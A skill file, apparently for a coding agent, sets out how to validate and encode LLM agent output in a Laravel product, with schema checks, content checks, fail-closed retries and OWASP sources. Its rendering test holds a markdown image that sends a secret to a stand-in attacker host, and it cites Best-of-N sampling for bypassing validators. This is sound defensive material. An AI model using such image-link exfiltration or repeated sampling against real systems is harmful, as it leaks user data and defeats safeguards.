---
name: agent-output-validation
description: Load when a product's LLM agent output feeds code, a database, a screen or a customer: schema and code validation, content checks, fail-closed retries, sink encoding.
---

# Agent output validation

Treat every model output as untrusted user input. Code validates it before anything uses it, and a failed check stops the output.

## When to use

- A model call returns structured data that code stores, branches on or passes to a tool.
- A model writes text a customer, a user or an operator will read.
- Model output is rendered in a web page, an admin panel, an email or a push notification.
- A review of `personas/_shared/planning/agent-systems.md` raises output validation or rendering.

## Rules

- **Validate every model output in code before any downstream use.** Injected or wrong output otherwise reaches the database, the screen or the customer (OWASP LLM05). https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/
- **Use the provider's schema or constrained decoding, and still validate the parsed object in code.** A schema is a guarantee only when the provider enforces it, and a refusal can return empty without an error. https://prismphp.com/core-concepts/structured-output.html
- **Check the finish reason, a refusal, required fields and enum membership on every structured response.** A truncated or refused response can still parse as valid JSON. https://prismphp.com/core-concepts/structured-output.html
- **Run deterministic content checks on every text that reaches a customer.** OWASP asks for deterministic code that checks outputs match the expected format and content (OWASP LLM01). https://genai.owasp.org/llmrisk/llm01-prompt-injection/
- **Block another user's personal data in output with a code check, never a prompt rule.** Prompt restrictions on data can be bypassed through injection (OWASP LLM02). https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/
- **Fail closed: a failed check stores no output, sends nothing and triggers no action.** An output that skips a failed check is the leak the check exists to stop. https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- **Retry with feedback only after a format error, with a hard cap of two or three attempts.** A capped retry fixes malformed JSON and limits cost (OWASP LLM10). https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/
- **Never retry until a policy validator passes.** Repeated sampling turns the validator into an oracle, and Best-of-N sampling reached 89% attack success on GPT-4o. https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- **Encode output for its sink: escape HTML, bind SQL parameters, and never render model text unescaped.** Unescaped model text gives stored XSS and image-link exfiltration. https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
- **Use structured outputs with enums between steps instead of free text.** A free-text field can carry instructions into the next model or tool. https://developers.openai.com/api/docs/guides/agent-builder-safety

## Steps

1. Name the sink of each model output: database column, tool argument, rendered page, email, push text, another model.
2. Define the schema. Use enums for every closed set, required fields, and a maximum length on each string.
3. Turn on the provider's strict schema mode where the provider supports it.
4. Write one validator class per output type. It runs these checks in order and returns a list of failure codes:

   | check | fails when |
   |---|---|
   | finish reason | the reason is not a normal stop, for example a length cut or a content filter |
   | refusal | the response is empty, a refusal, or carries no structured object |
   | required fields | a required field is missing or empty |
   | enums | a value is outside its allowed set |
   | length cap | the text exceeds the maximum the sink accepts |

5. Add the content checks for text a customer reads:

   | check | fails when |
   |---|---|
   | other users' personal data | an email, phone, address or name appears that does not belong to the recipient |
   | names from examples | a name from a few-shot example or a past reply appears in the draft |
   | forbidden phrases | a promise, refund offer, legal claim or other listed phrase appears |
   | link allowlist | a URL points outside the allowlisted domains, or a markdown image appears |
   | citations | the draft cites a knowledge entry id that does not exist |
   | placeholders | `{{`, `[name]`, `TODO` or a template token is left in the text |

6. Classify each failure as format or policy. A format failure is bad JSON, a missing field or a wrong enum. A policy failure is any content check.
7. On a format failure, retry once or twice with the validator's error text in the prompt. After the cap, fail closed.
8. On a policy failure, fail closed at once. Store the failure code and the run id for review. Show the operator that no draft exists.
9. Encode at the sink. Return plain strings from API resources. Escape in the renderer, strip markdown images, and render only allowlisted links.

## Checks

- Find every structured call and confirm a validator follows it:
  `grep -rn "\->structured\|asStructured\|withSchema" app/`
- Find unescaped rendering in the dashboard and web repos:
  `grep -rn "v-html\|dangerouslySetInnerHTML\|{!!" resources/ src/`
- Find retry loops near model calls and confirm a numeric cap:
  `grep -rn -B3 -A10 "Prism::" app/ | grep -n "while\|retry(\|for ("`
- Fail-closed test: fake the model to return a refusal, then an object with a missing field. Assert no draft row, no send, no dispatched job.
- Content check tests: one unit test per check, each with a draft that must fail. Include a draft that copies a name from a few-shot example.
- Retry cap test: fake every attempt as malformed. Assert the call count equals the cap and no output is stored.
- Policy retry test: fake one policy failure. Assert the call count is one.
- Rendering test: a draft containing `![x](https://evil.example/?q=secret)` and an outside link is stripped or flagged before display.

## Laravel

Detect the stack first; never assume it:
`composer show prism-php/prism laravel/ai laravel/mcp 2>/dev/null`

- Prism PHP: on the newest Anthropic models, forced tool choice returns HTTP 400. `ToolChoice::Auto` avoids the error, but then the schema is not enforced. Validate the parsed array in PHP every time.
- Prism PHP: a refusal can return an empty structured result without an exception. Check it before reading fields.
- Prism PHP tests: `Prism::fake([...])` returns `PrismFake`. Feed it refusals, truncated responses and malformed objects, then assert with `assertCallCount`.
- `laravel/ai`: fake with `Agent::fake()->preventStrayPrompts()` and run the same validator on the faked output.
- `laravel/mcp`: validate each tool's output against its `outputSchema` in code before returning it. Return `Response::error` on failure.
- Validation: run `Validator::make($data, $rules)` with `required`, `in:`, `max:` rules. Throw on failure, and catch it at the job boundary so the job stores nothing.
- Rendering: Blade `{{ }}` escapes; `{!! !!}` must never wrap model text.

## Sources

- OWASP LLM05 Improper Output Handling — https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/
- OWASP LLM01 Prompt Injection — https://genai.owasp.org/llmrisk/llm01-prompt-injection/
- OWASP LLM02 Sensitive Information Disclosure — https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/
- OWASP LLM10 Unbounded Consumption — https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/
- OWASP LLM Prompt Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- Prism structured output — https://prismphp.com/core-concepts/structured-output.html
- OpenAI, Safety in building agents — https://developers.openai.com/api/docs/guides/agent-builder-safety
- Embrace The Red, markdown image exfiltration — https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
- Laravel MCP — https://laravel.com/docs/12.x/mcp
- Laravel AI SDK — https://laravel.com/docs/13.x/ai-sdk
